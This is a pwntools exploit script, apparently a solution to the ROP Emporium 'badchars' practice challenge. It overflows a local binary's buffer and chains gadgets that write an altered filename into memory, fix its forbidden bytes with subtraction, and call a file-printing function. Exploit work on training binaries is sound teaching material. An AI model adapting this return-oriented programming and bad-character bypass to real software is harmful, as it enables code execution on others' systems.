from pwn import *

elf = context.binary = ELF("./badchars")
r = process()

WRITE8 = p64(0x0000000000400634) #mov qword ptr [r13], r12; ret;
POP_RSI_R15 = p64(0x00000000004006a1)
POP_RDI = p64(0x00000000004006a3)
POP_R12_R13_R14_R15 = p64(0x000000000040069c)

SUB_R15 = p64(0x0000000000400630) #sub byte ptr [r15], r14b; ret; r14b -> lower 8 bits of r14 

PRINT_FILE = p64(0x00400620)

ADDRESS_PTR = 0x00601030 #other address had a badchar when address+6

#gdb.attach(r)

def write_8bytes(address, content):
    return POP_R12_R13_R14_R15 + p64(u64(content)) + p64(address) + b"A"*16 + WRITE8

def sub_1byte(address, value):
    return POP_R12_R13_R14_R15 + b"A"*16 + p64(value) + p64(address) + SUB_R15

def fix_string():
    return sub_1byte(ADDRESS_PTR+2, 1) + sub_1byte(ADDRESS_PTR+3, 1) + sub_1byte(ADDRESS_PTR+4, 1) + sub_1byte(ADDRESS_PTR+6, 1)

payload = b"A"*40 + write_8bytes(ADDRESS_PTR, b"flbh/tyt") + fix_string() + POP_RDI + p64(ADDRESS_PTR) + PRINT_FILE

r.clean()
r.sendline(payload)

r.interactive()
